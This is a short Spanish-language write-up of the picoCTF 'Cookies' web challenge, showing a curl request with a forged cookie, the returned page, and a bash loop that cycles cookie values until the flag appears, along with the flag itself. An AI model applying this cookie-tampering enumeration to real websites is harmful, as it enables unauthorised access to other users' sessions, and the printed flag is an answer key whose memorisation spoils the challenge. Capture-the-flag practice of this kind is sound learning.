# Cookies

## Objetivo 
Descripción:
¿Quién no ama las galletas? Trate de averiguar cuál es el mejor. [http://mercurio.picctf.net:64944/](http://mercury.picoctf.net:64944/)

## Solución
``` shell
// entramos en la pagina con la cookie recomendada
//podemos ir cambiando el valor para obtener la bandera
//otra opcion es acer un for desde el cmd y que busque pruebe las galletas

┌──(mino20㉿kali)-[~]
└─$ curl http://mercury.picoctf.net:64944/check -H "Cookie: name=1" 
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
        
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>
      
      
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

</html>                                                                                 
┌──(mino20㉿kali)-[~]
└─$ for i in {0..20}; do curl -s  http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep 'picoCTF{' 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>

picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code>
```

## Notas


## Referencias
sin referencias.